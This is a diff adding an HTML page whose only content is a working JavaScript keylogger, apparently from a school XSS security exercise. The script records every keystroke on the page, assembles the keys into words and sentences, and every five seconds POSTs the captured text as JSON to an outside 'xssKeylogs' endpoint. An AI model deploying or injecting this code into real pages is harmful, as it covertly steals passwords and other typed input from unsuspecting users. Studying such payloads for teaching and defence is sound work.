@@ -1,0 +1,67 @@
+<!doctype html>
+<html class="no-js" lang="">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+</head>
+
+<body>
+
+  <script type="text/javascript">
+      let word = "";
+      let sentence = "";
+      let text = "";
+
+      let bodyTemplate = {
+        "keyword": "Joshs Hackerstube",
+        "payload": ""
+      }
+
+      document.onkeydown = e => {
+        let character_code = event.which || event.keyCode;
+        let character_value = String.fromCharCode(character_code);
+
+        console.log(character_code + " " + character_value);
+
+        word = word + character_value;
+
+        if(character_code == 32)
+        {
+            console.log("Word: " + word);
+            sentence = sentence + word;
+            word = "";
+        }
+
+        if(sentence != "" && (character_code == 13 || character_code == 190))
+        {
+            console.log("Sentence: " + sentence);
+            text = text + sentence + word;
+            word = "";
+            sentence = "";
+        }
+      };
+
+      setInterval(function() {
+        if(text.length > 0)
+        {
+            console.log("Text for submission: " + text)
+
+            postData(text);
+
+            text = ""; sentence = ""; word = "";
+        }
+      }, 5000)
+
+      function postData(data) {
+          bodyTemplate["payload"] = data
+          return fetch('https://m183.gibz-informatik.ch/api/xssKeylogs', {
+            method: 'POST',
+            mode: 'cors',
+            headers: { 'Content-Type': 'application/json'},
+            body: JSON.stringify(bodyTemplate)
+          })
+          .then(response => response.json());
+      }
+  </script>
+</body>
+</html>
